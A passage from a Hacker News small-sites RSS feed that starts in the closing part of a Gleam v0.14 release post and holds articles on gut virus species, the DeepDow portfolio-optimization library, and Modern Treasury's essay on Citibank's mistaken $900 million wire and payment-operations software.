  <li><code>gleam-elixir-slim</code>: Gleam and the Elixir tooling on slim Debian Linux</li>
  <li><code>gleam-elixir-alpine</code>: Gleam and the Elixir tooling on Alpine Linux</li>
</ul>

<p>For all the images see the <a href="https://github.com/orgs/gleam-lang/packages/container/package/gleam">Gleam image registry</a>. Thanks Peter!</p>

<h2 id="other-stuff">Other stuff</h2>

<p>These are just some of the highlights, but there‚Äôs plenty more improvements
made to the compiler and the standard library since the last release. For all
the details check out the changelog files:</p>

<ul>
  <li><a href="https://github.com/gleam-lang/gleam/blob/main/CHANGELOG.md">Gleam‚Äôs changelog</a></li>
  <li><a href="https://github.com/gleam-lang/stdlib/blob/main/CHANGELOG.md">Gleam stdlib‚Äôs changelog</a></li>
</ul>

<h2 id="discord-chat">Discord chat</h2>

<p>It‚Äôs time to plug the Gleam Discord server again! The community continues to
grow and it would be great to have you there too, so please click on the
button below.</p>

<center>
  <a href="https://discord.gg/Fm8Pwmy"><img src="https://img.shields.io/discord/768594524158427167?color=blue" alt="Discord chat"></a>
</center>

<h2 id="try-it-out">Try it out</h2>

<p>If you want to try out the new version of Gleam head over to the <a href="https://gleam.run/getting-started/">getting started
page</a>. I‚Äôd love to hear how you find it and get your feedback so
Gleam can continue to improve.</p>

<p>Want to view some existing Gleam projects? Head on over to the
<a href="https://github.com/gleam-lang/awesome-gleam">awesome-gleam</a> list. Looking for something to build in
Gleam? Check out <a href="https://github.com/gleam-lang/suggestions/issues">the suggestions tracker</a>.</p>

<h2 id="supporting-gleam">Supporting Gleam</h2>

<p>If you would like to help make strongly typed programming on the Erlang
virtual machine a production-ready reality please consider <strong><a href="https://github.com/sponsors/lpil">sponsoring
Gleam</a></strong> via the GitHub Sponsors program.</p>

<p>‚≠ê Or alternatively give us a star on <a href="https://github.com/gleam-lang/gleam">GitHub</a>! ‚≠ê</p>

<p>This release would not have been possible without the support of all the
people who have <a href="https://github.com/sponsors/lpil">sponsored</a> and contributed
to it, so a huge thank you to them.</p>

<ul>
  <li><a href="https://github.com/adamnbowen">Adam Bowen</a></li>
  <li><a href="https://github.com/amokan">Adam Mokan</a></li>
  <li><a href="https://github.com/aditya7iyengar">Adi Iyengar</a></li>
  <li><a href="https://github.com/scripttease">Al Dee</a></li>
  <li><a href="https://github.com/mudriyjo">Alexander Babin</a></li>
  <li><a href="https://github.com/farhadi">Ali Farhadi</a></li>
  <li><a href="https://github.com/pd-andy">Andy Thompson</a></li>
  <li><a href="https://github.com/bees">Arian Daneshvar</a></li>
  <li><a href="https://github.com/arnodirlam">Arno Dirlam</a></li>
  <li><a href="https://github.com/benmyles">Ben Myles</a></li>
  <li><a href="https://github.com/nono">Bruno Michel</a></li>
  <li><a href="https://github.com/brightly-salty">Caden Haustein</a></li>
  <li><a href="https://github.com/choonkeat">Chew Choon Keat</a></li>
  <li><a href="https://github.com/chrislloyd">Chris Lloyd</a></li>
  <li><a href="https://github.com/worldofchris">Chris Young</a></li>
  <li><a href="https://github.com/tlvenn">Christian Meunier</a></li>
  <li><a href="https://github.com/clangley">clangley</a></li>
  <li><a href="https://github.com/cleverbunny">Clever Bunny LTD</a></li>
  <li><a href="https://github.com/codec-abc">codec-abc</a></li>
  <li><a href="https://github.com/colelawrence">Cole Lawrence</a></li>
  <li><a href="https://github.com/connorlay">Connor Lay (Clay)</a></li>
  <li><a href="https://github.com/cschembor3">Connor Schembor</a></li>
  <li><a href="https://github.com/unthought">Dan Mueller</a></li>
  <li><a href="https://github.com/davydog187">Dave Lucia</a></li>
  <li><a href="https://github.com/rawkode">David McKay</a></li>
  <li><a href="https://github.com/davidpdrsn">David Pedersen</a></li>
  <li><a href="https://github.com/dangdennis">Dennis Dang</a></li>
  <li><a href="https://github.com/lostbean">Edgar Gomes</a></li>
  <li><a href="https://github.com/ericmj">Eric Meadows-J√∂nsson</a></li>
  <li><a href="https://github.com/eterps">Erik Terpstra</a></li>
  <li><a href="https://github.com/floriank">Florian Kraft</a></li>
  <li><a href="https://github.com/itsgreggreg">greggreg</a></li>
  <li><a href="https://github.com/ggpasqualino">Guilherme Pasqualino</a></li>
  <li><a href="https://github.com/hendi">Hendrik Richter</a></li>
  <li><a href="https://github.com/hhandoko">Herdy Handoko</a></li>
  <li><a href="https://github.com/human154">human154</a></li>
  <li><a href="https://github.com/Ian-GL">Ian Gonz√°lez</a></li>
  <li><a href="https://github.com/igagen">Ingmar Gagen</a></li>
  <li><a href="https://github.com/ivarvong">Ivar Vong</a></li>
  <li><a href="https://github.com/gampleman">Jakub Hampl</a></li>
  <li><a href="https://github.com/jamesmacaulay">James MacAulay</a></li>
  <li><a href="https://github.com/janpieper">Jan Pieper</a></li>
  <li><a href="https://github.com/jechol">Jechol Lee</a></li>
  <li><a href="https://github.com/jeffkreeftmeijer">Jeff Kreeftmeijer</a></li>
  <li><a href="https://github.com/jiangplus">jiangplus</a></li>
  <li><a href="https://github.com/joecorkerton">Joe Corkerton</a></li>
  <li><a href="https://github.com/Jwsonic">John Palgut</a></li>
  <li><a href="https://github.com/josevalim">Jos√© Valim</a></li>
  <li><a href="https://github.com/jveiga">Jo√£o Veiga</a></li>
  <li><a href="https://github.com/jmn">Jussi Norlund</a></li>
  <li><a href="https://github.com/kapp-technology">Kapp Technology</a></li>
  <li><a href="https://github.com/kodeFant">Lars Lillo Ulvestad</a></li>
  <li><a href="https://github.com/lawik">Lars Wikman</a></li>
  <li><a href="https://github.com/leandrocp">Leandro Cesquini Pereira</a></li>
  <li><a href="https://github.com/malcolmseyd">Malcolm Seyd</a></li>
  <li><a href="https://github.com/mario-mazo">mario</a></li>
  <li><a href="https://github.com/mvellandi">Mario Vellandi</a></li>
  <li><a href="https://github.com/markmark206">Mark Markaryan</a></li>
  <li><a href="https://github.com/markusfeyh">Markus</a></li>
  <li><a href="https://github.com/derhechi">Markus Hechenberger</a></li>
  <li><a href="https://github.com/MattCheely">Matthew Cheely</a></li>
  <li><a href="https://github.com/bausano">Michael Bausano</a></li>
  <li><a href="https://github.com/michaeljones">Michael Jones</a></li>
  <li><a href="https://github.com/michallepicki">Micha≈Ç ≈Åƒôpicki</a></li>
  <li><a href="https://github.com/mroach">Mike Roach</a></li>
  <li><a href="https://github.com/slashmili">Milad</a></li>
  <li><a href="https://github.com/ndreynolds">Nick Reynolds</a></li>
  <li><a href="http://www.ninefx.com/">NineFX</a></li>
  <li><a href="https://github.com/jraregris">Oddmund Str√∏mme</a></li>
  <li><a href="https://github.com/sorentwo">Parker Selbert</a></li>
  <li><a href="https://github.com/phiat">Patrick Ryan</a></li>
  <li><a href="https://github.com/PeteJodo">Pete Jodo</a></li>
  <li><a href="https://github.com/CrowdHailer">Peter Saxton</a></li>
  <li><a href="https://github.com/praveenperera">Praveen Perera</a></li>
  <li><a href="https://github.com/qingliangcn">qingliangcn</a></li>
  <li><a href="https://github.com/happysalada">Raphael Megzari</a></li>
  <li><a href="https://github.com/chouzar">Ra√∫l  Humberto Chouza Delgado</a></li>
  <li><a href="https://github.com/redmar">Redmar Kerkhoff</a></li>
  <li><a href="https://github.com/reneklacan">Ren√© Klaƒçan</a></li>
  <li><a href="https://github.com/romatthe">Robin Mattheussen</a></li>
  <li><a href="https://github.com/rvcas">rvcas</a></li>
  <li><a href="https://github.com/samaaron">Sam Aaron</a></li>
  <li><a href="https://github.com/samontea">samontea</a></li>
  <li><a href="https://github.com/mrgleam">Santi</a></li>
  <li><a href="https://github.com/sascha-wolf">Sascha Wolf</a></li>
  <li><a href="https://github.com/sasa1977">Sa≈°a Juriƒá√ß</a></li>
  <li><a href="https://github.com/scottwey">Scott Wey</a></li>
  <li><a href="https://github.com/seanjensengrey">Sean Jensen-Grey</a></li>
  <li><a href="https://github.com/sporto">Sebastian</a></li>
  <li><a href="https://github.com/shanesveller">Shane Sveller</a></li>
  <li><a href="https://github.com/shritesh">Shritesh Bhattarai</a></li>
  <li><a href="https://github.com/simonewebdesign">Simone Vittori</a></li>
  <li><a href="https://github.com/syukronrm">Syukron Rifail M</a></li>
  <li><a href="https://github.com/terkiterje">Terje Bakken</a></li>
  <li><a href="https://github.com/timbuchwaldt">Tim Buchwaldt</a></li>
  <li><a href="https://github.com/tomekowal">Tomasz Kowal</a></li>
  <li><a href="https://github.com/thara">Tomochika Hara</a></li>
  <li><a href="https://github.com/topherhunt">Topher Hunt</a></li>
  <li><a href="https://github.com/tsloughter">Tristan Sloughter</a></li>
  <li><a href="https://github.com/twilco">Tyler Wilcock</a></li>
  <li><a href="https://github.com/tynanbe">tynanbe</a></li>
  <li><a href="https://github.com/wojtekmach">Wojtek Mach</a></li>
</ul>

<p>Thanks for reading! Have fun! üíú</p>

</div>

</article></div>]]>
            </description>
            <link>https://gleam.run/news/gleam-v0.14-released/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26185690</guid>
            <pubDate>Thu, 18 Feb 2021 21:16:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Over 140K virus species identified in human gut, 50% never seen before]]>
            </title>
            <description>
<![CDATA[
Score 10 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26185338">thread link</a>) | @finphil
<br/>
February 18, 2021 | https://nuadox.com/post/643491384977948672/140k-virus-species-in-human-gut | <a href="https://web.archive.org/web/*/https://nuadox.com/post/643491384977948672/140k-virus-species-in-human-gut">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> 
                 
                    
                    <article id="643491384977948672">
                        <div>
                            <div>
                                <a href="https://nuadox.com/post/643491384977948672/140k-virus-species-in-human-gut"><h2>Over 140K virus species identified in human gut, 50% never seen before</h2></a>
                                <figure data-orig-width="1280" data-orig-height="904"><img src="https://64.media.tumblr.com/1a0215a61c5578609506d640223a0ec8/5275df9a1bb2e1fe-38/s1280x1920/64f1e6d38b7d741e57ff618b396d3322a825dc76.jpg" alt="image" data-orig-width="1280" data-orig-height="904" width="1280" height="904"></figure><p><b>- By <a href="https://href.li/?https://www.sanger.ac.uk/">Wellcome Sanger Institute</a> -</b></p><p>

Viruses are the most numerous biological entities on the planet. Now researchers at the Wellcome Sanger Institute and EMBL‚Äôs European Bioinformatics Institute (EMBL-EBI) have identified over 140,000 viral species living in the human gut, more than half of which have never been seen before.

<br></p><p>The paper, published today in <i><a href="https://href.li/?https://doi.org/10.1016/j.cell.2021.01.029">Cell</a></i>, contains an analysis of over 28,000 gut microbiome samples collected in different parts of the world. The number and diversity of the viruses the researchers found was surprisingly high, and the data opens up new research avenues for understanding how viruses living in the gut affect human health.</p><p>The human gut is an incredibly biodiverse environment. In addition to bacteria, hundreds of thousands of viruses called bacteriophages, which can infect bacteria, also live in the human gut.</p><p>It is known that imbalances in our gut microbiome can contribute to diseases and complex conditions such as Inflammatory Bowel Disease, allergies and obesity. But relatively little is known about the role our gut bacteria, and the bacteriophages that infect them, play in human health and disease.</p><p>Using a DNA-sequencing method called metagenomics*, researchers at the Wellcome Sanger Institute and EMBL‚Äôs European Bioinformatics Institute (EMBL-EBI) explored and catalogued the biodiversity of the viral species found in 28,060 public human gut metagenomes and 2,898 bacterial isolate genomes cultured from the human gut.</p><p>The analysis identified over 140,000 viral species living in the human gut, more than half of which have never been seen before.</p><h2>‚ÄúIt‚Äôs important to remember that not all viruses are harmful, but represent an integral component of the gut ecosystem. For one thing, most of the viruses we found have DNA as their genetic material, which is different from the pathogens most people know, such as SARS-CoV-2 or Zika, which are RNA viruses. Secondly, these samples came mainly from healthy individuals who didn‚Äôt share any specific diseases. It‚Äôs fascinating to see how many unknown species live in our gut, and to try and unravel the link between them and human health.‚Äù<b><br></b></h2><p><b>Dr Alexandre Almeida, Postdoctoral Fellow at EMBL-EBI and the Wellcome Sanger Institute</b><br></p><p>Among the tens of thousands of viruses discovered, a new highly prevalent clade ‚Äì or group of viruses believed to have a common ancestor ‚Äì was identified, which the authors refer to as the Gubaphage. This was found to be the second most prevalent virus clade in the human gut, after the crAssphage, which was discovered in 2014.</p><p>Both of these viruses seem to infect similar types of human gut bacteria, but without further research it‚Äôs very difficult to know the exact functions of the newly discovered Gubaphage.</p><h2>‚ÄúAn important aspect of our work was to ensure that the reconstructed viral genomes were of the highest quality. A stringent quality control pipeline coupled with a machine learning approach enabled us to mitigate contamination and obtain highly complete viral genomes. High-quality viral genomes pave the way to better understand what role viruses play in our gut microbiome, including the discovery of new treatments such as antimicrobials from bacteriophage origin.‚Äù<br></h2><p><b><a href="https://href.li/?https://www.sanger.ac.uk/person/camarillo-guerrero-luis-fernando/">Dr Luis F. Camarillo-Guerrero,</a>&nbsp;first author of the study from the Wellcome Sanger Institute</b></p><p>

The results of the study form the basis of the Gut Phage Database (GPD), a highly curated database containing 142,809 non-redundant phage genomes that will be an invaluable resource for those studying bacteriophages and the role they play on regulating the health of both our gut bacteria and ourselves.

<br></p><h2>‚ÄúBacteriophage research is currently experiencing a renaissance. This high-quality, large-scale catalogue of human gut viruses comes at the right time to serve as a blueprint to guide ecological and evolutionary analysis in future virome studies.‚Äù</h2><p><b><a href="https://href.li/?https://www.sanger.ac.uk/person/lawley-trevor/">Dr Trevor Lawley,</a>&nbsp;senior author of the study from the Wellcome Sanger Institute</b></p><p>‚Äì</p><p><i>

* Metagenomics is the study of a collection of genetic material (genomes) from a mixed community of organisms. Metagenomics usually refers to the study of microbial communities. The NIH National Human Genome Research Institute has more information here: <a href="https://href.li/?https://www.genome.gov/genetics-glossary/Metagenomics" title="* this link opens in a new window/tab">https://www.genome.gov/genetics-glossary/Metagenomics</a></i><br></p><p><b>Source:&nbsp;<a href="https://href.li/?https://www.sanger.ac.uk/news_item/scientists-identify-over-140000-virus-species-in-the-human-gut-half-of-which-are-new-to-science/">Wellcome Sanger Institute</a></b></p><p><b>Full study:</b>&nbsp;‚ÄúMassive expansion of human gut bacteriophage diversity‚Äù,&nbsp;<i>Cell</i>.</p><p><a href="https://href.li/?https://doi.org/10.1016/j.cell.2021.01.029">https://doi.org/10.1016/j.cell.2021.01.029</a><br></p><h2><b>Read Also</b></h2><p><a href="https://nuadox.com/post/611601599114231808/fruit-fly-gut-microbiome">We could perhaps learn a lot by looking into a fruit fly‚Äôs gut</a></p>
                    
                      
                    
                    
                    
                    
                    
                    
                    
                    
                                             
                                <p><span>
                                    <p>
                                    
                                        <a href="https://nuadox.com/tagged/virus">virus</a>
                                    
                                        <a href="https://nuadox.com/tagged/gut">gut</a>
                                    
                                        <a href="https://nuadox.com/tagged/biology">biology</a>
                                    
                                        <a href="https://nuadox.com/tagged/microbiology">microbiology</a>
                                    
                                        <a href="https://nuadox.com/tagged/bacteriophage">bacteriophage</a>
                                    
                                        <a href="https://nuadox.com/tagged/molecular-biology">molecular biology</a>
                                    
                                        <a href="https://nuadox.com/tagged/dna">dna</a>
                                    
                                        <a href="https://nuadox.com/tagged/genomics">genomics</a>
                                    
                                    </p>
                                </span></p>
                                
                            </div>
                        </div>
                    </article>
                 
                </div></div>]]>
            </description>
            <link>https://nuadox.com/post/643491384977948672/140k-virus-species-in-human-gut</link>
            <guid isPermaLink="false">hacker-news-small-sites-26185338</guid>
            <pubDate>Thu, 18 Feb 2021 20:52:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[DeepDow ‚Äì Portfolio Optimization with Deep Learning]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26185234">thread link</a>) | @optimalsolver
<br/>
February 18, 2021 | https://jankrepl.github.io/deepdow/ | <a href="https://web.archive.org/web/*/https://jankrepl.github.io/deepdow/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section itemprop="text">
        
        <p>
   <img src="https://i.imgur.com/x77b8Lc.png" width="80%">
</p>


<p><a href="https://github.com/jankrepl/deepdow">DeepDow</a> is a Python package that focuses on neural networks that are able to perform asset allocation in a single forward pass.</p>


<p>Portfolio optimization is traditionally a two step procedure</p>

<ol>
  <li>Creation of beliefs about the future performance of securities</li>
  <li>Finding optimal portfolio given these beliefs</li>
</ol>

<p>One notorious example of the two step procedure (inspired by Markowitz) is</p>

<ol>
  <li>Estimation of expected returns \(\mu\) and covariance matrix $\boldsymbol{\Sigma}$</li>
  <li>Solving a convex optimization problem, e.g. $\boldsymbol{\mu}^T \textbf{w} - \gamma \textbf{w}^T  \boldsymbol{\Sigma} \textbf{w}$ such that $\textbf{w} &gt; 0$ and ${\bf 1}^T \textbf{w}=1$.</li>
</ol>

<p>Commonly, these two steps are absolutely separated since they require different approaches and different software.</p>

<p><code>deepdow</code> absolutely abandons this paradigm. It strives to merge the above mentioned two steps into one. The fundamental idea is to construct end-to-end deep networks that input the rawest features (returns, volumes, ‚Ä¶) and output asset allocation. This approach has multiple benefits:</p>

<ul>
  <li>Hyperparameters can be turned into trainable weights (i.e. ùõæ in 2nd stage)</li>
  <li>Leveraging deep learning to extract useful features for allocation, no need for technical indicators</li>
  <li>Single loss function</li>
</ul>


<p>Financial timeseries can be seen a 3D tensor with the following dimensions</p>

<ul>
  <li>time</li>
  <li>asset</li>
  <li>indicator/channel</li>
</ul>

<p>To give a specific example, one can investigate daily (time dimension) open price returns, close price returns and volumes (channel dimension) of multiple NASDAQ stocks (asset dimension). Graphically, one can imagine</p>

<p>
   <img src="https://i.imgur.com/RYcdN6y.png" width="55%">
</p>

<p>By fixing a time step (representing now), we can split our tensor into 3 disjoint subtensors</p>

<p>
   <img src="https://i.imgur.com/rsttnxn.png" width="50%">
</p>

<p>Firstly, <strong>x</strong> represents all the knowledge about the past and present. The second tensor <strong>g</strong> represents information contained in the immediate future that we cannot use to make investment decisions. Finally, <strong>y</strong> is the future evolution of the market. One can now move along the time dimension and apply the same decomposition at every time step. This method of generating a dataset is called the rolling window.</p>

<p>Now we focus on a special type of neural networks that input <strong>x</strong> and return a single weight allocation <strong>w</strong> over all assets such that $\sum_{i} w_{i} = 1$. In other words, given our past knowledge <strong>x</strong> we construct a portfolio <strong>w</strong> that we buy right away and hold for horizon time steps. Let <strong>F</strong> be some neural network with parameters ùúÉ, the below image represents the high level prediction pipeline.</p>
<p>
   <img src="https://i.imgur.com/sJ30WFE.png" width="65%">
</p>

<p>The last piece of the puzzle is definition of the loss function. In the most general terms, the per sample loss <strong>L</strong> is any function that inputs <strong>w</strong> and <strong>y</strong> and outputs a real number. However, in most cases we first compute the portfolio returns <strong>r</strong> over each time step in the horizon and then apply some summarization function <strong>S</strong> like mean, standard deviation, etc.</p>

<p>
   <img src="https://i.imgur.com/L0A2bRS.png" width="95%">
</p>


<p>Ok, but how do we construct such networks? Rather than hardcoding a single architecture <code>deepdow</code> implements powerful building blocks (layers) that the user can put together himself. The two most important groups of layers are</p>

<ul>
  <li><strong>Transformation</strong> layers: The goal is to extract features from the inputs
    <ul>
      <li>RNN</li>
      <li>1D convolutions</li>
      <li>Time warping</li>
      <li>‚Ä¶</li>
    </ul>
  </li>
  <li><strong>Allocation</strong> layers: Given input tensors they output a valid asset allocation
    <ul>
      <li>Differentiable convex optimization (<code>cvxpylayers</code>) i.e. Markowitz</li>
      <li>Softmax (sparse and constrained variants as well)</li>
      <li>Clustering based allocators</li>
      <li>‚Ä¶</li>
    </ul>
  </li>
</ul>

<p>The general pattern is to create a pipeline of multiple transformation layers followed by a single allocation layer at the end. Note that almost
any real valued hyperparameter can be turned into a learnable parameter or even predicted by some subnetwork.</p>


<p>If this article sparked your interest, feel free to check the below links.</p>

<ul>
  <li><a href="https://github.com/jankrepl/deepdow">GitHub</a></li>
  <li><a href="https://deepdow.readthedocs.io/en/latest/auto_examples/end_to_end/getting_started.html#sphx-glr-auto-examples-end-to-end-getting-started-py">Getting started tutorial</a></li>
  <li><a href="https://deepdow.readthedocs.io/">Docs</a></li>
  <li><a href="https://deepdow.readthedocs.io/en/latest/auto_examples/index.html">More examples</a></li>
</ul>

<p>I will be more than happy to answer any questions. Additionally, constructive criticism or help with development is much welcomed.</p>






        
      </section></div>]]>
            </description>
            <link>https://jankrepl.github.io/deepdow/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26185234</guid>
            <pubDate>Thu, 18 Feb 2021 20:42:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Bad Software and Expensive Mistakes]]>
            </title>
            <description>
<![CDATA[
Score 9 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26185082">thread link</a>) | @mattmarcus
<br/>
February 18, 2021 | https://www.moderntreasury.com/journal/bad-software-and-expensive-mistakes | <a href="https://web.archive.org/web/*/https://www.moderntreasury.com/journal/bad-software-and-expensive-mistakes">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>Recently, there‚Äôs been discussion about an accidental $900 million wire that Citibank sent out while Revlon was restructuring some of its debt. You can read the details <a href="https://www.bloomberg.com/opinion/articles/2021-02-17/citi-can-t-have-its-900-million-back" target="_blank">here</a>, but in short, the payment escaped controls and was completed, and when the team realized their mistake they asked for their money back. But they <a href="https://arstechnica.com/tech-policy/2021/02/citibank-just-got-a-500-million-lesson-in-the-importance-of-ui-design/" target="_blank">couldn‚Äôt</a> get it all back.<br></p><p>Although $900 million is an astonishing number, Citibank is not alone. In 2018 Deutsche Bank accidentally wired an exchange <a href="https://money.cnn.com/2018/04/19/investing/deutsche-bank-35-billion-mistake/index.html" target="_blank">$35 billion</a> ‚Äî $5 billion more than the bank was worth at the time. The worst ‚Äúfat-finger‚Äù mistake I know of happened in Tokyo in 2005, when a trader filed a share order worth <a href="https://spectrum.ieee.org/riskfactor/computing/it/japan-traders-617-billion-fat-finger-nearmiss-rattles-tokyo-market" target="_blank">$617 billion</a> and sent it to the exchange.<br></p><p>These types of errors happen all the time, and they‚Äôre entirely the fault of software, not people.&nbsp;<br></p><p>The Citibank case goes to the heart of why we started Modern Treasury.&nbsp;<br></p><p>In 2015, Sam and I started building a marketplace for individuals to invest in the renovation loans that LendingHome was making. Building a ‚Äúfractional‚Äù marketplace <a href="#1">[1]</a> increases the number of transactions in a system. When it really started working, it exploded the number of payments we made ‚Äî from hundreds to tens of thousands per month ‚Äî and that‚Äôs when we started uncovering the many issues that we now call ‚Äúpayment operations.‚Äù<br></p><p>In spite of being the lifeblood of every business, there has been a dearth of modern software built for payment operations in the past half century. So I wanted to share a few of our near misses and provide a perspective on why we believe so passionately that payment operations deserves great software.&nbsp;</p><h4>Could Citi‚Äôs Mistake Have been Prevented?&nbsp;<br></h4><p>There are several levels.<br></p><p>Here‚Äôs a screenshot of the <a href="https://www.oracle.com/industries/financial-services/banking/flexcube-universal-banking/" target="_blank">Flexcube</a> product that the team at Citibank used for this transaction. The team wanted to pay out interest but not loan principal, but in order to do so the software required an internal ‚Äúwash‚Äù account, and a process that involved checking three boxes (and no less: checking only one doesn‚Äôt trigger any alerts.) I think we can agree that this product is less than intuitive to use.<br></p><figure><p><img src="https://assets.website-files.com/5d7e7bbbcad517dd46cb55d3/602ec598b91eff48eb08f141_flexcube.png" loading="lazy" alt=""></p></figure><p>In addition to being simple to use, a payment ops product needs to be flexible. For this team, there is no API, so the workflow had been hard-coded years before. It was so out of date that the team had to have a <a href="https://www.bloomberg.com/opinion/articles/2021-02-17/citi-can-t-have-its-900-million-back" target="_blank">manual</a> to instruct how to work around it. The reason the high amount was being typed in at all was that this ‚Äúsoftware will only let you pay principal to some lenders if you pretend to pay it to every lender‚Äù (<a href="https://www.bloomberg.com/opinion/articles/2021-02-17/citi-can-t-have-its-900-million-back" target="_blank">source</a>). The workflow is so rigid it‚Äôs all or nothing.</p><p>Finally, controls. The Citibank team went through three levels of approvals over email. A good payment operations system should dynamically route payments to the right person or persons for release, but only if those users get the information they need to make an informed decision. Over email, that doesn‚Äôt happen.&nbsp;</p><p>Good people operating bad software will eventually make a mistake.&nbsp;<br>‚Äç<br></p><h3>How Software Like This Gets Built</h3><h4>Act One: The Tech Team Wants to Talk to the Bank</h4><p>The first realization we had when we set out to solve this problem at LendingHome was that in order to make payments, you must do so through your bank. But banks do not have clean APIs. To compensate, we had to build a custom bank integration.&nbsp;</p><p>The US has a single system for wire transfers, the Fedwire system, and that is the common denominator across all banks. But each bank then operates its own ‚Äúbank core‚Äù software on top of the Fedwire system, and that software maintains accounts and ledgers, records transactions, and so on. The bank therefore actually has a separate interface. So we now have two interfaces:&nbsp;</p><p>Customer -- Bank -- Fedwire</p><p>Building on these interfaces takes investment of time and resources, because bank cores are challenging to integrate with and understand. Some banks use <a href="https://www.moderntreasury.com/journal/what-is-direct-transmission" target="_blank">Direct Transmission</a> over SFTP while others provide SOAP APIs. Timings <a href="https://docs.moderntreasury.com/reference#ach-timings" target="_blank">vary</a>. There are different, competing, data exchange formats for things like reporting on errors, and the configurations can vary from banks on identical cores.&nbsp;<br></p><p>When pressed for resources, teams cut corners. It‚Äôs hard to justify investing in wonderful design and robust systems for internal processes, so much of what‚Äôs out there is half-built, inflexible, and non-intuitive, and rarely gets any attention from the design team.&nbsp;<br></p><p>The result of poor software is workarounds. We had finance colleagues who had Excel wizard skills and a tolerance for manual process pain at which we marveled, but at some point even they would come down to the engineering floor and, in a desperate cry for help, ask us to ‚ÄúJUST COMPUTER IT!‚Äù<br></p><p>(We registered that domain a couple of years later. Check out <a href="http://www.justcomputerit.com/" target="_blank">www.justcomputerit.com</a> the next time you‚Äôre frustrated with a payment ops problem.)</p><h4>Act Two: It‚Äôs Not One Bank, It‚Äôs Many</h4><p>It‚Äôs not just a single bank integration problem. It‚Äôs many.<br></p><p>Most companies, once they become somewhat large, operate on more than one bank. So not only does the engineering team have to understand and integrate with one bank, they have to repeat that process for each subsequent bank from scratch, and as we have seen, that‚Äôs a scary proposition.<br></p><p>Now we have many integrations:<br></p><p>Customer&nbsp;<br>-- Bank 1 -- Fedwire<br>-- Bank 2 -- Fedwire<br>-- Bank 3 -- Fedwire<br>-- Bank 4 -- Fedwire<br></p><div><p>Every bank is a unique filter on the Fedwire system, making it even harder to make it flexible, intuitive software. The challenges of a single bank integration are now proliferating, and the engineering team tasked with this has to grow.</p></div><h4>Act Three: The Controller Wants Control</h4><p>There‚Äôs good reasons why bank relationships are sensitive. After all, the executive team has a fiduciary responsibility to make sure company funds are safe and secure at all times. The CFO and their team are concerned about the prospect of the engineering team building an integration to talk to the bank and move money around whenever they want. Not to mention that with each money movement, the accounting team has to track, tag, and reconcile every dollar that moves in and out of every bank account.<br></p><p>‚ÄúMove fast and break things‚Äù is quite literally the worst way to sell software to CFOs.&nbsp;<br></p><p>So now we discover the next layer of issues: a good bank integration is necessary but not sufficient. There must be a smart, easy-to-use, and intuitive app for the controller that allows them to manage the process. Some of the features this app must have include the ability to create rules to manage the API, to monitor what is happening, and to provide context and trigger approvals for actions that are unexpected.&nbsp;<br></p><p>One such surprise happened to us when we were subleasing office space from Salesforce. The accounting team saw a giant payment to Salesforce and came over to us, angry and flustered that someone irresponsible had sent Salesforce several salaries‚Äô worth of cash for what should have been a few CRM seats. We were amused as we had to explain that indeed, the payment was made to Salesforce, yes, that Salesforce, but no, it wasn‚Äôt for software. It was rent.&nbsp;<br></p><h4>Bonus Act: Idempotency and Reversibility</h4><p>There are some very specific engineering concerns that anyone building a payment ops system has to keep in mind.&nbsp;<br></p><p>The first one is idempotency, or doing things only once. We put together a post on <a href="https://www.moderntreasury.com/journal/why-idempotency-matters-in-payments" target="_blank">‚ÄúWhy Idempotency Matters in Payments</a>,‚Äù which I highly encourage anyone working in payments to read, because the only thing worse than sending the wrong amount is sending it twice.&nbsp;<br></p><p>We lived this. One day we accidentally double-funded every mortgage: many millions of dollars, paid out twice. That was not a good day. Mercifully, because mortgages are disbursed to <a href="https://www.moderntreasury.com/journal/how-to-build-an-escrow-product" target="_blank">escrow</a>, we got all the funds back, but we never forgot idempotency matters in payments after that day.&nbsp;<br></p><div><p>Wires are not reversible, which makes mistakes particularly scary. There are other payment types, such as ACH, that are. If you sent an ACH and you didn‚Äôt mean to, or if someone debits your account without your permission, you can reverse it.<a href="#2">[2]</a> Approvals are important, but they‚Äôre particularly important for irreversible transactions, such as the wire Citi sent and couldn‚Äôt recall after sending.&nbsp;</p></div><h4>Thinking About Payment Ops as a Single Continuous Process</h4><p>Steve Jobs said, ‚ÄúDesign is not just what it looks like and feels like. Design is how it works.‚Äù&nbsp;<br></p><p>This sums up how we believe payment operations should run. Rather than have many silos for information ‚Äî from a database to a CSV to a bank portal to an accounting system ‚Äî we believe in a single piece of payment operations software. This software crosses systems and, perhaps most importantly, it crosses teams. The tech team wants to live in the <a href="https://www.moderntreasury.com/developer-solutions" target="_blank">API</a>, the finance team wants to live in the <a href="https://www.moderntreasury.com/finance-solutions" target="_blank">app</a>, accountants need <a href="https://www.moderntreasury.com/journal/introducing-continuous-accounting" target="_blank">continuous accounting</a>, and customer service teams need to <a href="https://www.moderntreasury.com/journal/how-customer-support-teams-use-modern-treasury" target="_blank">answer customer requests</a>.&nbsp;<br></p><p>We‚Äôve written at length in the <a href="https://www.moderntreasury.com/journal" target="_blank">Modern Treasury Journal</a> about these issues. ACH, wire, and paper check account for the <a href="https://www.moderntreasury.com/journal/b2b-payments-vs-c2b-payments-what-makes-them-so-different" target="_blank">vast majority</a> of payments in the US, and yet have seen very little innovation in the last fifty years.&nbsp;<br></p><p>We believe that will change this decade. <a href="https://angel.co/company/moderntreasury/jobs" target="_blank">Join us</a>, <a href="https://app.moderntreasury.com/sign_up" target="_blank">build with us</a>, and <a href="https://www.moderntreasury.com/journal" target="_blank">learn with us</a>.&nbsp;<br></p></div></div><div><h4>References</h4><div><div id="1"><p>A fractional loan marketplace is one where each loan is sold not to one institutional investor but to many individuals. This means that every repayment of that loan has to be split between all the investors that &nbsp;invested in each loan, and therefore number of individual transactions in the system balloons.</p></div><div id="2"><div><p>There are lots of ACH return codes, and you can check out our post on <a 